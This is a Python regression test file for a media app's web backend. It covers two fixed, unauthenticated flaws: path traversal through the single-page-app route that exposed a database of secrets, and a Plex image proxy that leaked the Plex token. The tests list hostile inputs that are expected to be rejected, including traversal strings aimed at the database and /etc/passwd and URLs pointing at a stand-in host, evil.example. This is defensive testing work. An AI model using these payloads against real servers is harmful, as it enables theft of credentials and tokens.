"""v0.9.155: two unauthenticated holes found in the pre-promotion audit.

1. The SPA catch-all joined the raw request path onto frontend/dist without
   normalising it, and sits outside the /api auth gate — so
   "/..%2f..%2fdata%2fshrinkerr.db" served the whole database (API key,
   session secret, password hash, Plex/TMDB tokens) to anyone.
2. /api/posters/image (also outside the auth gate, so <img> tags load)
   appended the caller's `path` to the Plex URL: "@evil.example/x" turned the
   Plex host into URL userinfo and sent the Plex token to evil.example.
"""
from pathlib import Path

import pytest

from backend.spa import spa_file


def _dist(tmp_path: Path) -> Path:
    dist = tmp_path / "frontend" / "dist"
    (dist / "assets").mkdir(parents=True)
    (dist / "index.html").write_text("<html></html>")
    (dist / "favicon.svg").write_text("<svg/>")
    (tmp_path / "data").mkdir()
    (tmp_path / "data" / "shrinkerr.db").write_text("SECRETS")
    return dist


def test_spa_serves_files_inside_dist(tmp_path):
    dist = _dist(tmp_path)
    assert spa_file(dist, "favicon.svg") == (dist / "favicon.svg").resolve()
    assert spa_file(dist, "") is None
    assert spa_file(dist, "scanner") is None  # SPA route → caller serves index.html


@pytest.mark.parametrize("attack", [
    "../../data/shrinkerr.db",
    "..%2f..%2fdata%2fshrinkerr.db".replace("%2f", "/"),  # as FastAPI decodes it
    "assets/../../../data/shrinkerr.db",
    "/etc/passwd",
])
def test_spa_never_serves_files_outside_dist(tmp_path, attack):
    dist = _dist(tmp_path)
    assert spa_file(dist, attack) is None


def test_spa_rejects_symlink_escaping_dist(tmp_path):
    dist = _dist(tmp_path)
    (dist / "link.db").symlink_to(tmp_path / "data" / "shrinkerr.db")
    assert spa_file(dist, "link.db") is None


from backend.routes.posters import plex_image_url  # noqa: E402


def test_plex_image_url_accepts_plex_thumb_paths():
    url = plex_image_url("http://plex:32400", "/library/metadata/123/thumb/1699999999", "tok")
    assert url == "http://plex:32400/library/metadata/123/thumb/1699999999?X-Plex-Token=tok"


@pytest.mark.parametrize("path", [
    "@evil.example/x",                      # Plex host becomes userinfo → token to evil.example
    "/library/metadata/1/thumb@evil.example",
    "//evil.example/library/metadata/1/thumb",
    "/../../:/prefs",                       # arbitrary Plex endpoints via the token
    "/library/metadata/1/thumb?x=1",
    "https://evil.example/a.jpg",
    "",
])
def test_plex_image_url_rejects_anything_else(path):
    assert plex_image_url("http://plex:32400", path, "tok") is None
